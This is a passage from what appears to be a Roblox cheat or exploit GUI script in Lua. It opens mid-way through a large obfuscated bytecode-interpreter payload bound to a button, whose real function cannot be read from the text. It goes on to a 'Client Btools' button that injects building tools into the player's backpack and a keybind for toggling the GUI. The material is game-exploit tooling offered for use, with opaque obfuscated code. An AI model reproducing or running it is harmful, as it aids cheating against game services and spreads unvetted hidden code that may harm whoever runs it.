111";{877;271;879;677};{563;184;267;64};}]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("pOva")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Zd")]]=lllIllIlllIllll[lllIlIIIll[#("yNa")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("TM")]]=lllIllIlllIllll[lllIlIIIll[#("VCp")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("yZ")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Z5F")]][lllIlIIIll[#("MbRq")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#{{164;829;428;896};{313;891;359;955};}]][lllIlIIIll[#("ouj")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Eca7")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];do return end;else IIIIllIIlllIIIIllIIII[lllIlIIIll[#("46")]]={};lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("e4")]]=lllIllIlllIllll[lllIlIIIll[#("Z4O")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("4s")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("eWm")]][lllIlIIIll[#("n6Mp")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("l9")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("hgy")]][lllIlIIIll[#("BP3D")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("dN")]][lllIlIIIll[#("nzH")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("iRdj")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("YH")]]=lllIllIlllIllll[lllIlIIIll[#("lsV")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Hx")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("u1N")]][lllIlIIIll[#("0gTv")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Sj")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("LV0")]][lllIlIIIll[#("7XLH")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("jN")]][lllIlIIIll[#("436")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("iK5J")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("WL")]]=lllIllIlllIllll[lllIlIIIll[#("WUp")]];end;elseif IIlllIlIIIIIlI>#("1JKuNzgCXq")then IIIIllIIlllIIIIllIIII[lllIlIIIll[#("tg")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("n1V")]][lllIlIIIll[#("5L6M")]];else IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Do")]]={};end;elseif IIlllIlIIIIIlI<=#("LOfTz1A6taffe")then if IIlllIlIIIIIlI>#("qEsB5IMh0yMR")then IIIIllIIlllIIIIllIIII[lllIlIIIll[#("AT")]][lllIlIIIll[#("Aib")]]=lllIlIIIll[#("Y7m9")];else IIIIllIIlllIIIIllIIII[lllIlIIIll[#("7i")]]=lllIllIlllIllll[lllIlIIIll[#("eIS")]];end;elseif IIlllIlIIIIIlI<=#("4jspvgiyuaT2YK")then local lllIlIIIll=lllIlIIIll[#("fN")]IIIIllIIlllIIIIllIIII[lllIlIIIll]=IIIIllIIlllIIIIllIIII[lllIlIIIll]()elseif IIlllIlIIIIIlI==#("YWWDGnx4Ya1SYDY")then lIIIlIIllIllIll=lllIlIIIll[#("zYy")];else IIIIllIIlllIIIIllIIII[lllIlIIIll[#{{847;564;830;693};{901;382;796;997};}]]();end;elseif IIlllIlIIIIIlI<=#("hSzGXaVU96U5DJJg7XteLjkoH")then if IIlllIlIIIIIlI<=#("FpFyt4HsMkAebXabDJDB")then if IIlllIlIIIIIlI<=#("oBUVbjTg8Hj8JGGpMM")then if IIlllIlIIIIIlI>#("yj7zR3VGdKQMVgWpY")then do return end;else IIIIllIIlllIIIIllIIII[lllIlIIIll[#("2K")]][lllIlIIIll[#("KlO")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("KV3p")]];end;elseif IIlllIlIIIIIlI>#("NsUYmNNpfDqFW16Odrq")then local lIlIIIlI=lllIlIIIll[#("5I")];local lIIIlIIllIllIll=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("rYJ")]];IIIIllIIlllIIIIllIIII[lIlIIIlI+1]=lIIIlIIllIllIll;IIIIllIIlllIIIIllIIII[lIlIIIlI]=lIIIlIIllIllIll[lllIlIIIll[#{{810;786;364;955};{213;404;762;224};"1 + 1 = 111";{588;177;374;147};}]];else local lIIIlIIllIllIll=lllIlIIIll[#("Ql")]IIIIllIIlllIIIIllIIII[lIIIlIIllIllIll]=IIIIllIIlllIIIIllIIII[lIIIlIIllIllIll](llIIllll(IIIIllIIlllIIIIllIIII,lIIIlIIllIllIll+1,lllIlIIIll[#("5C7")]))end;elseif IIlllIlIIIIIlI<=#{{499;401;235;984};{489;304;570;250};"1 + 1 = 111";"1 + 1 = 111";{752;354;349;592};"1 + 1 = 111";"1 + 1 = 111";{254;722;824;511};"1 + 1 = 111";{148;606;9;655};{332;191;283;482};"1 + 1 = 111";{142;222;562;923};"1 + 1 = 111";{284;347;125;838};"1 + 1 = 111";{117;746;911;349};"1 + 1 = 111";{481;707;777;218};"1 + 1 = 111";{134;334;82;594};"1 + 1 = 111";}then if IIlllIlIIIIIlI==#("roJXYPhdF9VRVdgiPuS0m")then IIIIllIIlllIIIIllIIII[lllIlIIIll[#("m4")]]();else lllIllIlllIllll[lllIlIIIll[#("ji5")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("9h")]];end;elseif IIlllIlIIIIIlI<=#("bWq2NJDt6rLd7zfTEprZrq6")then IIIIllIIlllIIIIllIIII[lllIlIIIll[#("x1")]][lllIlIIIll[#("imD")]]=lllIlIIIll[#("ysOM")];elseif IIlllIlIIIIIlI>#("nq8Br9cLLLnWG6bIKkcEfRfR")then IIIIllIIlllIIIIllIIII[lllIlIIIll[#("HK")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("IjI")]][lllIlIIIll[#("Aufz")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Vy")]][lllIlIIIll[#("Z8U")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("0Tt9")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("RK")]][lllIlIIIll[#{{366;881;56;85};"1 + 1 = 111";"1 + 1 = 111";}]]=lllIlIIIll[#("HVBx")];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("fN")]][lllIlIIIll[#("GaP")]]=lllIlIIIll[#("33UM")];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("4k")]][lllIlIIIll[#("frc")]]=lllIlIIIll[#("m4uC")];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];lllIllIlllIllll[lllIlIIIll[#("rCP")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("O4")]];else local IllllllIIlI;local IIlllIlIIIIIlI;lllIllIlllIllll[lllIlIIIll[#("kXF")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#{"1 + 1 = 111";"1 + 1 = 111";}]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("XX")]]=lllIllIlllIllll[lllIlIIIll[#("Nns")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIlllIlIIIIIlI=lllIlIIIll[#{{519;462;926;383};"1 + 1 = 111";}]IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI]=IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI]()lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIlllIlIIIIIlI=lllIlIIIll[#("j7")];IllllllIIlI=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("ucy")]];IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI+1]=IllllllIIlI;IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI]=IllllllIIlI[lllIlIIIll[#("ldZ1")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#{{275;616;973;754};{720;912;943;150};}]]=lllIlIIIll[#("NCi")];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIlllIlIIIIIlI=lllIlIIIll[#("lC")]IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI]=IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI](llIIllll(IIIIllIIlllIIIIllIIII,IIlllIlIIIIIlI+1,lllIlIIIll[#("dGp")]))lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];if IIIIllIIlllIIIIllIIII[lllIlIIIll[#{"1 + 1 = 111";"1 + 1 = 111";}]]then lIIIlIIllIllIll=lIIIlIIllIllIll+1;else lIIIlIIllIllIll=lllIlIIIll[#("f1S")];end;end;elseif IIlllIlIIIIIlI<=#{{908;563;608;697};{235;602;425;829};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{866;671;567;516};{531;679;268;74};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{594;499;456;526};{547;698;818;378};{417;497;103;337};"1 + 1 = 111";{619;207;149;289};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{591;621;681;462};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}then if IIlllIlIIIIIlI<=#("GkrzviKcmlE6drP7IigofoSGTSt")then if IIlllIlIIIIIlI==#("ZhrGyUilsNPYP7pkSxkpJWR8hn")then local lIIIlIIllIllIll=lllIlIIIll[#("Fo")]IIIIllIIlllIIIIllIIII[lIIIlIIllIllIll]=IIIIllIIlllIIIIllIIII[lIIIlIIllIllIll](llIIllll(IIIIllIIlllIIIIllIIII,lIIIlIIllIllIll+1,lllIlIIIll[#("Etz")]))else local lllIlIIIll=lllIlIIIll[#("hL")]IIIIllIIlllIIIIllIIII[lllIlIIIll]=IIIIllIIlllIIIIllIIII[lllIlIIIll]()end;elseif IIlllIlIIIIIlI==#("rCWPOYumf47IsjEO4DrKh8IXvIeQ")then IIIIllIIlllIIIIllIIII[lllIlIIIll[#("qs")]]=lllIllIlllIllll[lllIlIIIll[#("kdc")]];else lllIllIlllIllll[lllIlIIIll[#("FKb")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("tu")]];end;elseif IIlllIlIIIIIlI<=#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{428;231;384;92};{589;624;595;463};{509;23;392;876};"1 + 1 = 111";{835;306;477;426};{112;151;909;362};{948;307;929;191};"1 + 1 = 111";{668;234;935;106};"1 + 1 = 111";"1 + 1 = 111";{890;920;572;228};{548;659;128;271};{100;262;517;408};{778;998;701;801};{875;292;281;762};"1 + 1 = 111";{40;108;264;86};"1 + 1 = 111";{482;534;475;923};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{891;986;641;217};{505;924;608;920};"1 + 1 = 111";{613;769;911;526};}then if IIlllIlIIIIIlI>#("PkPKIymsUg6CsqxXrcHQ7L4NYJHLHZ")then IIIIllIIlllIIIIllIIII[lllIlIIIll[#("R6")]]=IllllllIIlI(IlIlIIIllllIIl[lllIlIIIll[#{"1 + 1 = 111";{359;343;796;911};"1 + 1 = 111";}]],nil,lllIllIlllIllll);else IIIIllIIlllIIIIllIIII[lllIlIIIll[#("uU")]]=IllllllIIlI(IlIlIIIllllIIl[lllIlIIIll[#("hkV")]],nil,lllIllIlllIllll);end;elseif IIlllIlIIIIIlI<=#("P5oPKFQmBPXub0dHxiGN5WAXdqcW90LV")then IIIIllIIlllIIIIllIIII[lllIlIIIll[#("u8")]]=lllIlIIIll[#("No8")];elseif IIlllIlIIIIIlI>#("IrGdLXrL0gbjq2WUckDalN3GCMtD4nKdb")then local IIlllIlIIIIIlI;IIIIllIIlllIIIIllIIII[lllIlIIIll[#("8H")]]=lllIllIlllIllll[lllIlIIIll[#("iTv")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIlllIlIIIIIlI=lllIlIIIll[#("no")]IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI]=IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI]()lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("UT")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("li2")]][lllIlIIIll[#{"1 + 1 = 111";{140;174;14;101};"1 + 1 = 111";"1 + 1 = 111";}]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];lllIllIlllIllll[lllIlIIIll[#("evB")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("1c")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Z5")]]=lllIllIlllIllll[lllIlIIIll[#("ZBa")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIlllIlIIIIIlI=lllIlIIIll[#("KP")]IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI]=IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI]()lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("EH")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("aq4")]][lllIlIIIll[#("E2Yl")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];lllIllIlllIllll[lllIlIIIll[#{"1 + 1 = 111";{895;754;855;9};{46;559;500;49};}]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("d0")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Xj")]]=lllIllIlllIllll[lllIlIIIll[#("gAz")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIlllIlIIIIIlI=lllIlIIIll[#("s1")]IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI]=IIIIllIIlllIIIIllIIII[IIlllIlIIIIIlI]()else lIIIlIIllIllIll=lllIlIIIll[#("fpG")];end;lIIIlIIllIllIll=lIIIlIIllIllIll+1;end;end);end;return IllllllIIlI(true,{},IIllIIIIIllIlI())();end)(string.byte,table.insert,setmetatable);
end)

e:Button("Client Btools",function()
    local tool1 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
local tool2 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
local tool3 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
local tool4 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
local tool5 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
tool1.BinType = "Clone"
tool2.BinType = "GameTool"
tool3.BinType = "Hammer"
tool4.BinType = "Script"
tool5.BinType = "Grab"
end)

e:Button("",function()
    
end)



f:h1("Settings")

f:Bind("Toggle GUI",Enum.KeyCode.P,true,function(a)
   library:SetBind(a)
   print("Set".. a ..  " as a gui keybind")
end)
